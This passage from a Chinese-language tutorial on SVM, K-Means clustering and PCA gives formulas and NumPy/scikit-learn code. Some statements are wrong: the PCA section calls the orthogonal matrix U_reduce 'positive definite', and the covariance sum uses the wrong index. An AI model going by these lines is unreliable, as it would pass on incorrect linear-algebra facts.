{[{y^{(i)}}\\cos {t_1}({\\theta ^T}{f^{(i)}}) + (1 - {y^{(i)}})\\cos {t_0}({\\theta ^T}{f^{(i)}})} ] + \\frac{1}{2}\\sum\\limits_{j = 1}^{\\text{n}} {\\theta _j^2} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%5Ctheta%20%29%20%3D%20C%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%7By%5E%7B%28i%29%7D%7D%5Ccos%20%7Bt_1%7D%28%7B%5Ctheta%20%5ET%7D%7Bf%5E%7B%28i%29%7D%7D%29%20%2B%20%281%20-%20%7By%5E%7B%28i%29%7D%7D%29%5Ccos%20%7Bt_0%7D%28%7B%5Ctheta%20%5ET%7D%7Bf%5E%7B%28i%29%7D%7D%29%7D%20%5D%20%2B%20%5Cfrac%7B1%7D%7B2%7D%5Csum%5Climits_%7Bj%20%3D%201%7D%5E%7B%5Ctext%7Bn%7D%7D%20%7B%5Ctheta%20_j%5E2%7D%20)\n - \u5982\u679c![{\\theta ^T}f \\geqslant 0](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20%7B%5Ctheta%20%5ET%7Df%20%5Cgeqslant%200)\uff0c==\u300b\u9884\u6d4b`y=1`\n\n### 4\u3001\u4f7f\u7528`scikit-learn`\u4e2d\u7684`SVM`\u6a21\u578b\u4ee3\u7801\n- [\u5168\u90e8\u4ee3\u7801](\/SVM\/SVM_scikit-learn.py)\n- \u7ebf\u6027\u53ef\u5206\u7684,\u6307\u5b9a\u6838\u51fd\u6570\u4e3a`linear`\uff1a\n```\n    '''data1\u2014\u2014\u7ebf\u6027\u5206\u7c7b'''\n    data1 = spio.loadmat('data1.mat')\n    X = data1['X']\n    y = data1['y']\n    y = np.ravel(y)\n    plot_data(X,y)\n    \n    model = svm.SVC(C=1.0,kernel='linear').fit(X,y) # \u6307\u5b9a\u6838\u51fd\u6570\u4e3a\u7ebf\u6027\u6838\u51fd\u6570\n```\n- \u975e\u7ebf\u6027\u53ef\u5206\u7684\uff0c\u9ed8\u8ba4\u6838\u51fd\u6570\u4e3a`rbf`\n```\n    '''data2\u2014\u2014\u975e\u7ebf\u6027\u5206\u7c7b'''\n    data2 = spio.loadmat('data2.mat')\n    X = data2['X']\n    y = data2['y']\n    y = np.ravel(y)\n    plt = plot_data(X,y)\n    plt.show()\n    \n    model = svm.SVC(gamma=100).fit(X,y)     # gamma\u4e3a\u6838\u51fd\u6570\u7684\u7cfb\u6570\uff0c\u503c\u8d8a\u5927\u62df\u5408\u7684\u8d8a\u597d\n```\n### 5\u3001\u8fd0\u884c\u7ed3\u679c\n- \u7ebf\u6027\u53ef\u5206\u7684\u51b3\u7b56\u8fb9\u754c\uff1a    \n![enter description here][32]\n- \u7ebf\u6027\u4e0d\u53ef\u5206\u7684\u51b3\u7b56\u8fb9\u754c\uff1a   \n![enter description here][33]\n\n--------------------------\n\n## \u4e94\u3001K-Means\u805a\u7c7b\u7b97\u6cd5\n- [\u5168\u90e8\u4ee3\u7801](\/K-Means\/K-Menas.py)\n\n### 1\u3001\u805a\u7c7b\u8fc7\u7a0b\n- \u805a\u7c7b\u5c5e\u4e8e\u65e0\u76d1\u7763\u5b66\u4e60\uff0c\u4e0d\u77e5\u9053y\u7684\u6807\u8bb0\u5206\u4e3aK\u7c7b\n- K-Means\u7b97\u6cd5\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\n - \u7b2c\u4e00\u6b65\uff1a\u7c07\u5206\u914d\uff0c\u968f\u673a\u9009`K`\u4e2a\u70b9\u4f5c\u4e3a\u4e2d\u5fc3\uff0c\u8ba1\u7b97\u5230\u8fd9`K`\u4e2a\u70b9\u7684\u8ddd\u79bb\uff0c\u5206\u4e3a`K`\u4e2a\u7c07\n - \u7b2c\u4e8c\u6b65\uff1a\u79fb\u52a8\u805a\u7c7b\u4e2d\u5fc3\uff1a\u91cd\u65b0\u8ba1\u7b97\u6bcf\u4e2a**\u7c07**\u7684\u4e2d\u5fc3\uff0c\u79fb\u52a8\u4e2d\u5fc3\uff0c\u91cd\u590d\u4ee5\u4e0a\u6b65\u9aa4\u3002\n- \u5982\u4e0b\u56fe\u6240\u793a\uff1a\n - \u968f\u673a\u5206\u914d\u7684\u805a\u7c7b\u4e2d\u5fc3  \n ![enter description here][34]\n - \u91cd\u65b0\u8ba1\u7b97\u805a\u7c7b\u4e2d\u5fc3\uff0c\u79fb\u52a8\u4e00\u6b21  \n ![enter description here][35]\n - \u6700\u540e`10`\u6b65\u4e4b\u540e\u7684\u805a\u7c7b\u4e2d\u5fc3  \n ![enter description here][36]\n\n- \u8ba1\u7b97\u6bcf\u6761\u6570\u636e\u5230\u54ea\u4e2a\u4e2d\u5fc3\u6700\u8fd1\u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u627e\u5230\u6bcf\u6761\u6570\u636e\u8ddd\u79bb\u54ea\u4e2a\u7c7b\u4e2d\u5fc3\u6700\u8fd1    \ndef findClosestCentroids(X,initial_centroids):\n    m = X.shape[0]                  # \u6570\u636e\u6761\u6570\n    K = initial_centroids.shape[0]  # \u7c7b\u7684\u603b\u6570\n    dis = np.zeros((m,K))           # \u5b58\u50a8\u8ba1\u7b97\u6bcf\u4e2a\u70b9\u5206\u522b\u5230K\u4e2a\u7c7b\u7684\u8ddd\u79bb\n    idx = np.zeros((m,1))           # \u8981\u8fd4\u56de\u7684\u6bcf\u6761\u6570\u636e\u5c5e\u4e8e\u54ea\u4e2a\u7c7b\n    \n    '''\u8ba1\u7b97\u6bcf\u4e2a\u70b9\u5230\u6bcf\u4e2a\u7c7b\u4e2d\u5fc3\u7684\u8ddd\u79bb'''\n    for i in range(m):\n        for j in range(K):\n            dis[i,j] = np.dot((X[i,:]-initial_centroids[j,:]).reshape(1,-1),(X[i,:]-initial_centroids[j,:]).reshape(-1,1))\n    \n    '''\u8fd4\u56dedis\u6bcf\u4e00\u884c\u7684\u6700\u5c0f\u503c\u5bf9\u5e94\u7684\u5217\u53f7\uff0c\u5373\u4e3a\u5bf9\u5e94\u7684\u7c7b\u522b\n    - np.min(dis, axis=1)\u8fd4\u56de\u6bcf\u4e00\u884c\u7684\u6700\u5c0f\u503c\n    - np.where(dis == np.min(dis, axis=1).reshape(-1,1)) \u8fd4\u56de\u5bf9\u5e94\u6700\u5c0f\u503c\u7684\u5750\u6807\n     - \u6ce8\u610f\uff1a\u53ef\u80fd\u6700\u5c0f\u503c\u5bf9\u5e94\u7684\u5750\u6807\u6709\u591a\u4e2a\uff0cwhere\u90fd\u4f1a\u627e\u51fa\u6765\uff0c\u6240\u4ee5\u8fd4\u56de\u65f6\u8fd4\u56de\u524dm\u4e2a\u9700\u8981\u7684\u5373\u53ef\uff08\u56e0\u4e3a\u5bf9\u4e8e\u591a\u4e2a\u6700\u5c0f\u503c\uff0c\u5c5e\u4e8e\u54ea\u4e2a\u7c7b\u522b\u90fd\u53ef\u4ee5\uff09\n    '''  \n    dummy,idx = np.where(dis == np.min(dis, axis=1).reshape(-1,1))\n    return idx[0:dis.shape[0]]  # \u6ce8\u610f\u622a\u53d6\u4e00\u4e0b\n```\n- \u8ba1\u7b97\u7c7b\u4e2d\u5fc3\u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u8ba1\u7b97\u7c7b\u4e2d\u5fc3\ndef computerCentroids(X,idx,K):\n    n = X.shape[1]\n    centroids = np.zeros((K,n))\n    for i in range(K):\n        centroids[i,:] = np.mean(X[np.ravel(idx==i),:], axis=0).reshape(1,-1)   # \u7d22\u5f15\u8981\u662f\u4e00\u7ef4\u7684,axis=0\u4e3a\u6bcf\u4e00\u5217\uff0cidx==i\u4e00\u6b21\u627e\u51fa\u5c5e\u4e8e\u54ea\u4e00\u7c7b\u7684\uff0c\u7136\u540e\u8ba1\u7b97\u5747\u503c\n    return centroids\n```\n\n### 2\u3001\u76ee\u6807\u51fd\u6570\n- \u4e5f\u53eb\u505a**\u5931\u771f\u4ee3\u4ef7\u51fd\u6570**\n- ![J({c^{(1)}}, \\cdots ,{c^{(m)}},{u_1}, \\cdots ,{u_k}) = \\frac{1}{m}\\sum\\limits_{i = 1}^m {||{x^{(i)}} - {u_{{c^{(i)}}}}|{|^2}} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%7Bc%5E%7B%281%29%7D%7D%2C%20%5Ccdots%20%2C%7Bc%5E%7B%28m%29%7D%7D%2C%7Bu_1%7D%2C%20%5Ccdots%20%2C%7Bu_k%7D%29%20%3D%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%7C%7C%7Bx%5E%7B%28i%29%7D%7D%20-%20%7Bu_%7B%7Bc%5E%7B%28i%29%7D%7D%7D%7D%7C%7B%7C%5E2%7D%7D%20)\n- \u6700\u540e\u6211\u4eec\u60f3\u5f97\u5230\uff1a  \n![enter description here][37]\n- \u5176\u4e2d![{c^{(i)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bc%5E%7B%28i%29%7D%7D)\u8868\u793a\u7b2c`i`\u6761\u6570\u636e\u8ddd\u79bb\u54ea\u4e2a\u7c7b\u4e2d\u5fc3\u6700\u8fd1\uff0c\n- \u5176\u4e2d![{u_i}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bu_i%7D)\u5373\u4e3a\u805a\u7c7b\u7684\u4e2d\u5fc3\n\n### 3\u3001\u805a\u7c7b\u4e2d\u5fc3\u7684\u9009\u62e9\n- \u968f\u673a\u521d\u59cb\u5316\uff0c\u4ece\u7ed9\u5b9a\u7684\u6570\u636e\u4e2d\u968f\u673a\u62bd\u53d6K\u4e2a\u4f5c\u4e3a\u805a\u7c7b\u4e2d\u5fc3\n- \u968f\u673a\u4e00\u6b21\u7684\u7ed3\u679c\u53ef\u80fd\u4e0d\u597d\uff0c\u53ef\u4ee5\u968f\u673a\u591a\u6b21\uff0c\u6700\u540e\u53d6\u4f7f\u4ee3\u4ef7\u51fd\u6570\u6700\u5c0f\u7684\u4f5c\u4e3a\u4e2d\u5fc3\n- \u5b9e\u73b0\u4ee3\u7801\uff1a(\u8fd9\u91cc\u968f\u673a\u4e00\u6b21)\n```\n# \u521d\u59cb\u5316\u7c7b\u4e2d\u5fc3--\u968f\u673a\u53d6K\u4e2a\u70b9\u4f5c\u4e3a\u805a\u7c7b\u4e2d\u5fc3\ndef kMeansInitCentroids(X,K):\n    m = X.shape[0]\n    m_arr = np.arange(0,m)      # \u751f\u62100-m-1\n    centroids = np.zeros((K,X.shape[1]))\n    np.random.shuffle(m_arr)    # \u6253\u4e71m_arr\u987a\u5e8f    \n    rand_indices = m_arr[:K]    # \u53d6\u524dK\u4e2a\n    centroids = X[rand_indices,:]\n    return centroids\n```\n\n### 4\u3001\u805a\u7c7b\u4e2a\u6570K\u7684\u9009\u62e9\n- \u805a\u7c7b\u662f\u4e0d\u77e5\u9053y\u7684label\u7684\uff0c\u6240\u4ee5\u4e0d\u77e5\u9053\u771f\u6b63\u7684\u805a\u7c7b\u4e2a\u6570\n- \u8098\u90e8\u6cd5\u5219\uff08Elbow method\uff09\n - \u4f5c\u4ee3\u4ef7\u51fd\u6570`J`\u548c`K`\u7684\u56fe\uff0c\u82e5\u662f\u51fa\u73b0\u4e00\u4e2a\u62d0\u70b9\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c`K`\u5c31\u53d6\u62d0\u70b9\u5904\u7684\u503c\uff0c\u4e0b\u56fe\u6b64\u65f6`K=3`\n ![enter description here][38]\n - \u82e5\u662f\u5f88\u5e73\u6ed1\u5c31\u4e0d\u660e\u786e\uff0c\u4eba\u4e3a\u9009\u62e9\u3002\n- \u7b2c\u4e8c\u79cd\u5c31\u662f\u4eba\u4e3a\u89c2\u5bdf\u9009\u62e9\n\n### 5\u3001\u5e94\u7528\u2014\u2014\u56fe\u7247\u538b\u7f29\n- \u5c06\u56fe\u7247\u7684\u50cf\u7d20\u5206\u4e3a\u82e5\u5e72\u7c7b\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u7c7b\u4ee3\u66ff\u539f\u6765\u7684\u50cf\u7d20\u503c\n- \u6267\u884c\u805a\u7c7b\u7684\u7b97\u6cd5\u4ee3\u7801\uff1a\n```\n# \u805a\u7c7b\u7b97\u6cd5\ndef runKMeans(X,initial_centroids,max_iters,plot_process):\n    m,n = X.shape                   # \u6570\u636e\u6761\u6570\u548c\u7ef4\u5ea6\n    K = initial_centroids.shape[0]  # \u7c7b\u6570\n    centroids = initial_centroids   # \u8bb0\u5f55\u5f53\u524d\u7c7b\u4e2d\u5fc3\n    previous_centroids = centroids  # \u8bb0\u5f55\u4e0a\u4e00\u6b21\u7c7b\u4e2d\u5fc3\n    idx = np.zeros((m,1))           # \u6bcf\u6761\u6570\u636e\u5c5e\u4e8e\u54ea\u4e2a\u7c7b\n    \n    for i in range(max_iters):      # \u8fed\u4ee3\u6b21\u6570\n        print u'\u8fed\u4ee3\u8ba1\u7b97\u6b21\u6570\uff1a%d'%(i+1)\n        idx = findClosestCentroids(X, centroids)\n        if plot_process:    # \u5982\u679c\u7ed8\u5236\u56fe\u50cf\n            plt = plotProcessKMeans(X,centroids,previous_centroids) # \u753b\u805a\u7c7b\u4e2d\u5fc3\u7684\u79fb\u52a8\u8fc7\u7a0b\n            previous_centroids = centroids  # \u91cd\u7f6e\n        centroids = computerCentroids(X, idx, K)    # \u91cd\u65b0\u8ba1\u7b97\u7c7b\u4e2d\u5fc3\n    if plot_process:    # \u663e\u793a\u6700\u7ec8\u7684\u7ed8\u5236\u7ed3\u679c\n        plt.show()\n    return centroids,idx    # \u8fd4\u56de\u805a\u7c7b\u4e2d\u5fc3\u548c\u6570\u636e\u5c5e\u4e8e\u54ea\u4e2a\u7c7b\n```\n\n### 6\u3001[\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u7ebf\u6027\u6a21\u578b\u5b9e\u73b0\u805a\u7c7b](\/K-Means\/K-Means_scikit-learn.py)\n\n- \u5bfc\u5165\u5305\n```\n    from sklearn.cluster import KMeans\n```\n- \u4f7f\u7528\u6a21\u578b\u62df\u5408\u6570\u636e\n```\n    model = KMeans(n_clusters=3).fit(X) # n_clusters\u6307\u5b9a3\u7c7b\uff0c\u62df\u5408\u6570\u636e\n```\n- \u805a\u7c7b\u4e2d\u5fc3\n```\n    centroids = model.cluster_centers_  # \u805a\u7c7b\u4e2d\u5fc3\n```\n\n### 7\u3001\u8fd0\u884c\u7ed3\u679c\n- \u4e8c\u7ef4\u6570\u636e\u7c7b\u4e2d\u5fc3\u7684\u79fb\u52a8  \n![enter description here][39]\n- \u56fe\u7247\u538b\u7f29  \n![enter description here][40]\n\n\n----------------------\n\n## \u516d\u3001PCA\u4e3b\u6210\u5206\u5206\u6790\uff08\u964d\u7ef4\uff09\n- [\u5168\u90e8\u4ee3\u7801](\/PCA\/PCA.py)\n\n### 1\u3001\u7528\u5904\n- \u6570\u636e\u538b\u7f29\uff08Data Compression\uff09,\u4f7f\u7a0b\u5e8f\u8fd0\u884c\u66f4\u5feb\n- \u53ef\u89c6\u5316\u6570\u636e\uff0c\u4f8b\u5982`3D-->2D`\u7b49\n- ......\n\n### 2\u30012D-->1D\uff0cnD-->kD\n- \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6240\u6709\u6570\u636e\u70b9\u53ef\u4ee5\u6295\u5f71\u5230\u4e00\u6761\u76f4\u7ebf\uff0c\u662f**\u6295\u5f71\u8ddd\u79bb\u7684\u5e73\u65b9\u548c**\uff08\u6295\u5f71\u8bef\u5dee\uff09\u6700\u5c0f\n![enter description here][41]\n- \u6ce8\u610f\u6570\u636e\u9700\u8981`\u5f52\u4e00\u5316`\u5904\u7406\n- \u601d\u8def\u662f\u627e`1`\u4e2a`\u5411\u91cfu`,\u6240\u6709\u6570\u636e\u6295\u5f71\u5230\u4e0a\u9762\u4f7f\u6295\u5f71\u8ddd\u79bb\u6700\u5c0f\n- \u90a3\u4e48`nD-->kD`\u5c31\u662f\u627e`k`\u4e2a\u5411\u91cf![$${u^{(1)}},{u^{(2)}} \\ldots {u^{(k)}}$$](http:\/\/latex.codecogs.com\/gif.latex?%24%24%7Bu%5E%7B%281%29%7D%7D%2C%7Bu%5E%7B%282%29%7D%7D%20%5Cldots%20%7Bu%5E%7B%28k%29%7D%7D%24%24)\uff0c\u6240\u6709\u6570\u636e\u6295\u5f71\u5230\u4e0a\u9762\u4f7f\u6295\u5f71\u8bef\u5dee\u6700\u5c0f\n - eg:3D-->2D,2\u4e2a\u5411\u91cf![$${u^{(1)}},{u^{(2)}}$$](http:\/\/latex.codecogs.com\/gif.latex?%24%24%7Bu%5E%7B%281%29%7D%7D%2C%7Bu%5E%7B%282%29%7D%7D%24%24)\u5c31\u4ee3\u8868\u4e00\u4e2a\u5e73\u9762\u4e86\uff0c\u6240\u6709\u70b9\u6295\u5f71\u5230\u8fd9\u4e2a\u5e73\u9762\u7684\u6295\u5f71\u8bef\u5dee\u6700\u5c0f\u5373\u53ef\n\n### 3\u3001\u4e3b\u6210\u5206\u5206\u6790PCA\u4e0e\u7ebf\u6027\u56de\u5f52\u7684\u533a\u522b\n- \u7ebf\u6027\u56de\u5f52\u662f\u627e`x`\u4e0e`y`\u7684\u5173\u7cfb\uff0c\u7136\u540e\u7528\u4e8e\u9884\u6d4b`y`\n- `PCA`\u662f\u627e\u4e00\u4e2a\u6295\u5f71\u9762\uff0c\u6700\u5c0f\u5316data\u5230\u8fd9\u4e2a\u6295\u5f71\u9762\u7684\u6295\u5f71\u8bef\u5dee\n\n### 4\u3001PCA\u964d\u7ef4\u8fc7\u7a0b\n- \u6570\u636e\u9884\u5904\u7406\uff08\u5747\u503c\u5f52\u4e00\u5316\uff09\n - \u516c\u5f0f\uff1a![$${\\rm{x}}_j^{(i)} = {{{\\rm{x}}_j^{(i)} - {u_j}} \\over {{s_j}}}$$](http:\/\/latex.codecogs.com\/gif.latex?%24%24%7B%5Crm%7Bx%7D%7D_j%5E%7B%28i%29%7D%20%3D%20%7B%7B%7B%5Crm%7Bx%7D%7D_j%5E%7B%28i%29%7D%20-%20%7Bu_j%7D%7D%20%5Cover%20%7B%7Bs_j%7D%7D%7D%24%24)\n - \u5c31\u662f\u51cf\u53bb\u5bf9\u5e94feature\u7684\u5747\u503c\uff0c\u7136\u540e\u9664\u4ee5\u5bf9\u5e94\u7279\u5f81\u7684\u6807\u51c6\u5dee\uff08\u4e5f\u53ef\u4ee5\u662f\u6700\u5927\u503c-\u6700\u5c0f\u503c\uff09\n - \u5b9e\u73b0\u4ee3\u7801\uff1a\n ```\n     # \u5f52\u4e00\u5316\u6570\u636e\n    def featureNormalize(X):\n        '''\uff08\u6bcf\u4e00\u4e2a\u6570\u636e-\u5f53\u524d\u5217\u7684\u5747\u503c\uff09\/\u5f53\u524d\u5217\u7684\u6807\u51c6\u5dee'''\n        n = X.shape[1]\n        mu = np.zeros((1,n));\n        sigma = np.zeros((1,n))\n        \n        mu = np.mean(X,axis=0)\n        sigma = np.std(X,axis=0)\n        for i in range(n):\n            X[:,i] = (X[:,i]-mu[i])\/sigma[i]\n        return X,mu,sigma\n ```\n- \u8ba1\u7b97`\u534f\u65b9\u5dee\u77e9\u9635\u03a3`\uff08Covariance Matrix\uff09\uff1a![$$\\Sigma  = {1 \\over m}\\sum\\limits_{i = 1}^n {{x^{(i)}}{{({x^{(i)}})}^T}} $$](http:\/\/latex.codecogs.com\/gif.latex?%24%24%5CSigma%20%3D%20%7B1%20%5Cover%20m%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5En%20%7B%7Bx%5E%7B%28i%29%7D%7D%7B%7B%28%7Bx%5E%7B%28i%29%7D%7D%29%7D%5ET%7D%7D%20%24%24)\n - \u6ce8\u610f\u8fd9\u91cc\u7684`\u03a3`\u548c\u6c42\u548c\u7b26\u53f7\u4e0d\u540c\n - \u534f\u65b9\u5dee\u77e9\u9635`\u5bf9\u79f0\u6b63\u5b9a`\uff08\u4e0d\u7406\u89e3\u6b63\u5b9a\u7684\u770b\u770b\u7ebf\u4ee3\uff09\n - \u5927\u5c0f\u4e3a`nxn`,`n`\u4e3a`feature`\u7684\u7ef4\u5ea6\n - \u5b9e\u73b0\u4ee3\u7801\uff1a\n ```\n Sigma = np.dot(np.transpose(X_norm),X_norm)\/m  # \u6c42Sigma\n ```\n- \u8ba1\u7b97`\u03a3`\u7684\u7279\u5f81\u503c\u548c\u7279\u5f81\u5411\u91cf\n - \u53ef\u4ee5\u662f\u7528`svd`\u5947\u5f02\u503c\u5206\u89e3\u51fd\u6570\uff1a`U,S,V = svd(\u03a3)`\n - \u8fd4\u56de\u7684\u662f\u4e0e`\u03a3`\u540c\u6837\u5927\u5c0f\u7684\u5bf9\u89d2\u9635`S`\uff08\u7531`\u03a3`\u7684\u7279\u5f81\u503c\u7ec4\u6210\uff09[**\u6ce8\u610f**\uff1a`matlab`\u4e2d\u51fd\u6570\u8fd4\u56de\u7684\u662f\u5bf9\u89d2\u9635\uff0c\u5728`python`\u4e2d\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5411\u91cf\uff0c\u8282\u7701\u7a7a\u95f4]\n - \u8fd8\u6709\u4e24\u4e2a**\u9149\u77e9\u9635**U\u548cV\uff0c\u4e14![$$\\Sigma  = US{V^T}$$](http:\/\/latex.codecogs.com\/gif.latex?%24%24%5CSigma%20%3D%20US%7BV%5ET%7D%24%24)\n - ![enter description here][42]\n - **\u6ce8\u610f**\uff1a`svd`\u51fd\u6570\u6c42\u51fa\u7684`S`\u662f\u6309\u7279\u5f81\u503c\u964d\u5e8f\u6392\u5217\u7684\uff0c\u82e5\u4e0d\u662f\u4f7f\u7528`svd`,\u9700\u8981\u6309**\u7279\u5f81\u503c**\u5927\u5c0f\u91cd\u65b0\u6392\u5217`U`\n- \u964d\u7ef4\n - \u9009\u53d6`U`\u4e2d\u7684\u524d`K`\u5217\uff08\u5047\u8bbe\u8981\u964d\u4e3a`K`\u7ef4\uff09\n - ![enter description here][43]\n - `Z`\u5c31\u662f\u5bf9\u5e94\u964d\u7ef4\u4e4b\u540e\u7684\u6570\u636e\n - \u5b9e\u73b0\u4ee3\u7801\uff1a\n ```\n     # \u6620\u5c04\u6570\u636e\n    def projectData(X_norm,U,K):\n        Z = np.zeros((X_norm.shape[0],K))\n        \n        U_reduce = U[:,0:K]          # \u53d6\u524dK\u4e2a\n        Z = np.dot(X_norm,U_reduce) \n        return Z\n ```\n- \u8fc7\u7a0b\u603b\u7ed3\uff1a\n - `Sigma = X'*X\/m`\n - `U,S,V = svd(Sigma)`\n - `Ureduce = U[:,0:k]`\n - `Z = Ureduce'*x`\n\n### 5\u3001\u6570\u636e\u6062\u590d\n - \u56e0\u4e3a\uff1a![$${Z^{(i)}} = U_{reduce}^T*{X^{(i)}}$$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24%7BZ%5E%7B%28i%29%7D%7D%20%3D%20U_%7Breduce%7D%5ET*%7BX%5E%7B%28i%29%7D%7D%24%24)\n - \u6240\u4ee5\uff1a![$${X_{approx}} = {(U_{reduce}^T)^{ - 1}}Z$$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24%7BX_%7Bapprox%7D%7D%20%3D%20%7B%28U_%7Breduce%7D%5ET%29%5E%7B%20-%201%7D%7DZ%24%24)     \uff08\u6ce8\u610f\u8fd9\u91cc\u662fX\u7684\u8fd1\u4f3c\u503c\uff09\n - \u53c8\u56e0\u4e3a`Ureduce`\u4e3a\u6b63\u5b9a\u77e9\u9635\uff0c\u3010\u6b63\u5b9a\u77e9\u9635\u6ee1\u8db3\uff1a![$$A{A^T} = {A^T}A = E$$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24A%7BA%5ET%7D%20%3D%20%7BA%5ET%7DA%20%3D%20E%24%24)\uff0c\u6240\u4ee5\uff1a![$${A^{ - 1}} = {A^T}$$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24%7BA%5E%7B%20-%201%7D%7D%20%3D%20%7BA%5ET%7D%24%24)\u3011\uff0c\u6240\u4ee5\u8fd9\u91cc\uff1a\n - ![$${X_{approx}} = {(U_{reduce}^{ - 1})^{ - 1}}Z = {U_{reduce}}Z$$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24%7BX_%7Bapprox%7D%7D%20%3D%20%7B%28U_%7Breduce%7D%5E%7B%20-%201%7D%29%5E%7B%20-%201%7D%7DZ%20%3D%20%7BU_%7Breduce%7D%7DZ%24%24)\n - \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n    # \u6062\u590d\u6570\u636e \n    def recoverData(Z,U,K):\n        X_rec = np.zeros((Z.shape[0],U.shape[0]))\n        U_recude = U[:,0:K]\n        X_rec = np.dot(Z,np.transpose(U_recude))  # \u8fd8\u539f\u6570\u636e\uff08\u8fd1\u4f3c\uff09\n        return X_rec\n```\n\n### 6\u3001\u4e3b\u6210\u5206\u4e2a\u6570\u7684\u9009\u62e9\uff08\u5373\u8981\u964d\u7684\u7ef4\u5ea6\uff09\n- \u5982\u4f55\u9009\u62e9\n - **\u6295\u5f71\u8bef\u5dee**\uff08project error\uff09\uff1a![$${1 \\over m}\\sum\\limits_{i = 1}^m {||{x^{(i)}} - x_{approx}^{(i)}|{|^2}} $$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24%7B1%20%5Cover%20m%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%7C%7C%7Bx%5E%7B%28i%29%7D%7D%20-%20x_%7Bapprox%7D%5E%7B%28i%29%7D%7C%7B%7C%5E2%7D%7D%20%24%24)\n - **\u603b\u53d8\u5dee**\uff08total variation\uff09:![$${1 \\over m}\\sum\\limits_{i = 1}^m {||{x^{(i)}}|{|^2}} $$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24%7B1%20%5Cover%20m%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%7C%7C%7Bx%5E%7B%28i%29%7D%7D%7C%7B%7C%5E2%7D%7D%20%24%24)\n - \u82e5**\u8bef\u5dee\u7387**\uff08error ratio\uff09\uff1a![$${{{1 \\over m}\\sum\\limits_{i = 1}^m {||{x^{(i)}} - x_{approx}^{(i)}|{|^2}} } \\over {{1 \\over m}\\sum\\limits_{i = 1}^m {||{x^{(i)}}|{|^2}} }} \\le 0.01$$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24%7B%7B%7B1%20%5Cover%20m%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%7C%7C%7Bx%5E%7B%28i%29%7D%7D%20-%20x_%7Bapprox%7D%5E%7B%28i%29%7D%7C%7B%7C%5E2%7D%7D%20%7D%20%5Cover%20%7B%7B1%20%5Cover%20m%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%7C%7C%7Bx%5E%7B%28i%29%7D%7D%7C%7B%7C%5E2%7D%7D%20%7D%7D%20%5Cle%200.01%24%24)\uff0c\u5219\u79f0`99%`\u4fdd\u7559\u5dee\u5f02\u6027\n - \u8bef\u5dee\u7387\u4e00\u822c\u53d6`1%\uff0c5%\uff0c10%`\u7b49\n- \u5982\u4f55\u5b9e\u73b0\n - \u82e5\u662f\u4e00\u4e2a\u4e2a\u8bd5\u7684\u8bdd\u4ee3\u4ef7\u592a\u5927\n - \u4e4b\u524d`U,S,V = svd(Sigma)`,\u6211\u4eec\u5f97\u5230\u4e86`S`\uff0c\u8fd9\u91cc\u8bef\u5dee\u7387error ratio:    \n ![$$error{\\kern 1pt} \\;ratio = 1 - {{\\sum\\limits_{i = 1}^k {{S_{ii}}} } \\over {\\sum\\limits_{i = 1}^n {{S_{ii}}} }} \\le threshold$$](http:\/\/latex.codecogs.com\/gif.latex?%5Cfn_cm%20%24%24error%7B%5Ckern%201pt%7D%20%5C%3Bratio%20%3D%201%20-%20%7B%7B%5Csum%5Climits_%7Bi%20%3D%201%7D%5Ek%20%7B%7BS_%7Bii%7D%7D%7D%20%7D%20%5Cover%20%7B%5Csum%5Climits_%7Bi%20%3D%201%7D%5En%20%7B%7BS_%7Bii%7D%7D%7D%20%7D%7D%20%5Cle%20threshold%24%24)\n - \u53ef\u4ee5\u4e00\u70b9\u70b9\u589e\u52a0`K`\u5c1d\u8bd5\u3002\n\n### 7\u3001\u4f7f\u7528\u5efa\u8bae\n- \u4e0d\u8981\u4f7f\u7528PCA\u53bb\u89e3\u51b3\u8fc7\u62df\u5408\u95ee\u9898`Overfitting`\uff0c\u8fd8\u662f\u4f7f\u7528\u6b63\u5219\u5316\u7684\u65b9\u6cd5\uff08\u5982\u679c\u4fdd\u7559\u4e86\u5f88\u9ad8\u7684\u5dee\u5f02\u6027\u8fd8\u662f\u53ef\u4ee5\u7684\uff09\n- \u53ea\u6709\u5728\u539f\u6570\u636e\u4e0a\u6709\u597d\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u8fd0\u884c\u5f88\u6162\uff0c\u624d\u8003\u8651\u4f7f\u7528PCA\n\n### 8\u3001\u8fd0\u884c\u7ed3\u679c\n- 2\u7ef4\u6570\u636e\u964d\u4e3a1\u7ef4\n - \u8981\u6295\u5f71\u7684\u65b9\u5411     \n![enter description here][44]\n - 2D\u964d\u4e3a1D\u53ca\u5bf9\u5e94\u5173\u7cfb        